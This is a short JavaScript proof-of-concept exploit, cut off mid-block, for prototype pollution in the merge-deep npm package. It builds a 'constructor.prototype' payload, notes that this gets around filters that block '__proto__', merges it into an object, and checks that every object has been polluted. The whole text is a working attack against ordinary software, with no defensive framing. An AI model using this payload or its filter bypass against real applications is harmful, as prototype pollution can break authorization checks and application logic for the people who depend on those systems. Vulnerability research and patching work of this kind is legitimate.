    const mergeDeep = require('merge-deep');

    // The previous attempt relied on "__proto__", which is often sanitized or blocked.
    // Deep merge libraries historically allow recursive traversal into 'constructor' 
    // and 'prototype' keys. When merging into target.constructor (which references Object),
    // the library effectively performs: Object.prototype.exploited = true.
    const maliciousPayload = {
        "constructor": {
            "prototype": {
                "exploited": true
            }
        }
    };

    const target = {};

    // Trigger the vulnerability by merging the payload into an empty object
    mergeDeep(target, maliciousPayload);

    // Verification: Check if 'exploited' is now accessible on all objects via prototype chain
    if ({}.exploited === true) {
        console.log("POC SUCCESS: Prototype has been successfully polluted with the property 'exploited'.");
